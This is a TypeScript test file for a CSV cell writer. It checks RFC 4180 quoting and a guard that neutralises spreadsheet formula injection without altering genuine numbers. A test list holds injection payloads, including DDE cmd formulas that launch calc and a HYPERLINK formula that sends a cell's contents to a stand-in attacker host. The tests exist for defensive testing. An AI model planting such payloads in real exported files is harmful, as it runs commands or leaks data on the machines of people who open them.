import { describe, expect, it } from 'vitest';
import { csvCell, csvRow, toCsv } from './csv';

describe('csvCell — RFC 4180', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvCell('Paris')).toBe('Paris');
    expect(csvCell('')).toBe('');
  });

  it.each([
    ['Paris, France', '"Paris, France"'],
    ['a "quoted" word', '"a ""quoted"" word"'],
    ['two\nlines', '"two\nlines"'],
    ['carriage\rreturn', '"carriage\rreturn"'],
  ])('quotes %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });
});

/**
 * V35 wave 4 — the five cells the audit sent through the old writer untouched. Each
 * one is a formula to Excel, LibreOffice and Google Sheets.
 */
describe('csvCell — a spreadsheet must read data, not code', () => {
  const HOSTILE = [
    "=cmd|'/c calc'!A1",
    "@SUM(1+9)*cmd|'/c calc'!A1",
    '+1+1',
    "-2+3+cmd|'/c calc'!A1",
    '\t=1+1',
    '\r=1+1',
    '=HYPERLINK("http://evil.example/?"&A1,"click")',
  ];

  it.each(HOSTILE)('neutralises %j', (input) => {
    const out = csvCell(input);
    // Strip the RFC 4180 quoting to see what a spreadsheet puts in the cell.
    const cell = out.startsWith('"') ? out.slice(1, -1).replaceAll('""', '"') : out;
    expect(cell.startsWith("'"), `${JSON.stringify(cell)} still opens a formula`).toBe(true);
    // The value itself is preserved — neutralised, not truncated or rewritten.
    expect(cell.slice(1)).toBe(input);
  });

  it('leaves every one of them evaluable if the guard is removed', () => {
    // The negative control: without the apostrophe these are formulas. If this
    // ever passes trivially the test above has stopped proving anything.
    for (const input of HOSTILE) {
      expect(/^[=+\-@\t\r]/.test(input), `${JSON.stringify(input)} is not a formula trigger`).toBe(
        true,
      );
    }
  });
});

/**
 * The half that matters as much: a guard that mangles real data is not a fix.
 * LabML's first promise is that it does not quietly change what you gave it.
 */
describe('csvCell — a number is still a number', () => {
  /** What the spreadsheet actually puts in the cell, RFC 4180 quoting undone. */
  const cellOf = (out: string) =>
    out.startsWith('"') ? out.slice(1, -1).replaceAll('""', '"') : out;

  it.each(['-5', '+3.2', '-0.001', '+3.2e4', '-1E-7', '-1,5', '+,5', '-0', '42'])(
    'leaves %j unprefixed',
    (input) => {
      // The property that matters is « no apostrophe was added », not « the
      // bytes are identical »: `-1,5` contains a comma and must still be
      // quoted, which is RFC 4180 doing its job rather than the guard firing.
      expect(cellOf(csvCell(input))).toBe(input);
    },
  );

  it('quotes a French decimal without neutralising it', () => {
    expect(csvCell('-1,5')).toBe('"-1,5"');
    // A thousands space makes it not-a-number, so the guard fires — and should.
    expect(csvCell('-1 234,5')).toBe('"\'-1 234,5"');
  });

  it('neutralises a value that only looks numeric at the start', () => {
    expect(csvCell('-2+3')).toBe("'-2+3");
    expect(csvCell('+1+1')).toBe("'+1+1");
  });
});

describe('csvRow and toCsv', () => {
  it('joins cells with a comma', () => {
    expect(csvRow(['a', 'b,c', '=1'])).toBe('a,"b,c",\'=1');
  });

  it('writes a header and its rows', () => {
    expect(
      toCsv(
        ['name', 'score'],
        [
          ['iris', '0.97'],
          ['=cmd', '-5'],
        ],
      ),
    ).toBe("name,score\niris,0.97\n'=cmd,-5");
  });
});
